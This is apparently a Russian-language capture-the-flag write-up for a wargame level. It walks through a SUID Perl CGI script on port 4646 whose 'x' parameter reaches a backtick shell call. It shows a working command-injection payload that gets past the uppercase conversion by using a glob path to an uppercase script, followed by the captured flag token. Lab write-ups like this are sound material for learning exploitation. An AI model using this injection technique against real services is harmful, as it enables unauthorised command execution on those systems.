```
ls -l
```
> total 4\
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl

На файле стоит SUID, а значит он должен выполнить getflag

```
cat level12.pl
```
> \#!/usr/bin/env perl\
\# localhost:4646\
use CGI qw{param};\
print "Content-type: text/html\n\n";\
\
sub t {\
  $nn = $_[1];\
  $xx = $_[0];\
  $xx =~ tr/a-z/A-Z/;\
  $xx =~ s/\s.\*//;\
  @output = \`egrep "^$xx" /tmp/xd 2>&1\`;\
  foreach $line (@output) {\
      ($f, $s) = split(/:/, $line);\
      if($s =~ $nn) {\
          return 1;\
      }\
  }\
  return 0;\
}\
\
sub n {\
  if($\_[0] == 1) {\
      print("..");\
  } else {\
      print(".");\
  }\
}\
\
n(t(param("x"), param("y")));

Делаем вывод, что сервер слушает порт 4646
Нам необходимо подать код в строку @output = \`egrep "^$xx" /tmp/xd 2>&1\`;, в нее входит $xx
По коду скрипта понятно, что нужно выполнить запрос с параметрами
Вся хитрость заключается в операторах perl
$xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.\*//;

Все символы первого аргумента переводятся в верхний регистр, поэтому все что нам нужно сделать это
запустить скрипт, который сможет запустится после всех преобразований

```
echo "/bin/getflag > /tmp/flag" > /tmp/EXPLOIT;
chmod +x /tmp/EXPLOIT
```
```
curl localhost:4646?x='$(/*/EXPLOIT)'
```
```
cat /tmp/flag
```
> Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
